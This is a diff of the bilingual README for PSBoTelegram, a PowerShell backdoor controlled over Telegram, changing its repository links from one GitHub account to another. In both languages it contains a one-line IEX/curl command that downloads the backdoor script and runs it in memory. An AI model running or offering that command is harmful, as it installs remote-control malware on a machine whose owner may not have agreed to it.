@@ -6,7 +6,7 @@ No me hago responsable de un mal uso del software. Rercordad que esto sólo es u
 
 Podeis probar el script abriendo una consola de powershell y ejecutando este comando:
 
-**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
+**IEX (curl "https://raw.githubusercontent.com/cybervaca/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
 
         ____  _____ ____      ______     __
        / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
@@ -21,7 +21,7 @@ PSBotTelegram es un script escrito en Powershell, que nos crea una backdoor que 
 
 # Instalación en Linux
 
-    git clone https://github.com/hackplayers/psbotelegram.git
+    git clone https://github.com/cybervaca/psbotelegram.git
     cd psbotelegram
     sudo apt-get update > /dev/null
     sudo apt-get install libunwind8 libicu55 
@@ -74,7 +74,7 @@ I am not responsible for any misuse of the software. Make sure this is only a pr
 
 You can test the script by opening a powershell console and running this command:
 
-**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
+**IEX (curl "https://raw.githubusercontent.com/cybervaca/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
 
 
         ____  _____ ____      ______     __
@@ -90,7 +90,7 @@ PSBotTelegram is a script written in Powershell, which creates a backdoor that c
 
 # Install in Linux
 
-    git clone https://github.com/hackplayers/psbotelegram.git
+    git clone https://github.com/cybervaca/psbotelegram.git
     cd psbotelegram
     sudo apt-get update > /dev/null
     sudo apt-get install libunwind8 libicu55 
